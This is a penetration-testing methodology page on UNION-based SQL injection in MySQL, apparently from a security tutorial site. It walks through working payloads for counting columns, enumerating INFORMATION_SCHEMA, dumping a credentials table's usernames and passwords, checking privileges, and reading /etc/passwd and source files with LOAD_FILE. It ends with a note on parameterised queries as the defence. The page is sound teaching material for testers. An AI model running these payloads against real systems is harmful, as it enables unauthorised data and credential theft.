---
layout: page
title: "UNION Injection"
subtitle: "Extracting data from other tables through a UNION query once the injection is confirmed"
permalink: /methodology/web-app/union-injection/
---

A UNION injection appends the results of a second `SELECT` to the results of the original query. It works only when the application renders the query output on the page. Once it works, the tester can read the database schema and any table the database user is allowed to read, one request at a time. Confirm the injection point first, as described on the [SQL injection](/methodology/web-app/sql-injection/) page.

## Requirements

- The original query output is rendered on the page.
- The number of columns in the original query is known.
- The data types of the injected columns are compatible with the originals. Numbers or `NULL` work as fillers.
- Reading files additionally needs the `FILE` privilege.

## Workflow

1. Determine the column count with `ORDER BY`. Increase the number until the page errors. The last value that works is the column count minus zero, so the first failing value is one more than the count.

```sql
' order by 1-- -
' order by 2-- -
' order by 5-- -
```

In the test case, `order by 5` failed on a four-column query.

2. Confirm with `UNION SELECT`. Add a `UNION` with fillers, increasing the count until results appear:

```sql
' UNION select 1,2,3-- -
```

3. Find a column that is rendered. Replace a filler with a function that shows its value. Column positions that are not displayed produce no visible output, and the second column is usually a safe first choice:

```sql
' UNION select 1,@@version,3,4-- -
```

4. Enumerate the schema through `INFORMATION_SCHEMA`, in this order: databases, tables, columns, then data.

Databases:

```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
' UNION select 1,database(),2,3-- -
```

Tables in one database:

```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Columns of one table:

```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Data from a table outside the current database uses the schema prefix:

```sql
' UNION select 1, username, password, 4 from dev.credentials-- -
```

5. Check the database user and its privileges. DBA rights are not needed to read data, but the privileges decide what can be read:

```sql
' UNION SELECT 1, user(), 3, 4-- -
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

6. Read local files when the `FILE` privilege is present:

```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

Reading the application source reveals other credentials, include paths and further injection points. The default Apache web root is `/var/www/html`.

## What to look for

- The column count and the column position that is rendered.
- Tables with names such as users, credentials, tokens or accounts.
- Whether the user holds `FILE` and can read the web root.
- Output that is truncated or escaped. Compare it with a known value before relying on it.

## Pitfalls

- A wrong column count returns an error, not partial data. Re-count after any change to the payload.
- A type mismatch also returns an error. Use numbers or `NULL` as fillers.
- The comment must be followed by a space. `-- -` is the safe form.
- If the original query wraps the input, for example in `LIKE (('...'))`, the closing characters must be restored. Use the prefix and suffix options in SQLMap, or adjust the payload by hand.
- Reading many rows by hand is slow. Switch to [SQLMap](/methodology/web-app/sqlmap/) once the injection is confirmed.

> Defense: parameterised queries prevent the UNION payload from altering the query. See [Prevention and remediation](/methodology/web-app/prevention/).
{: .info }
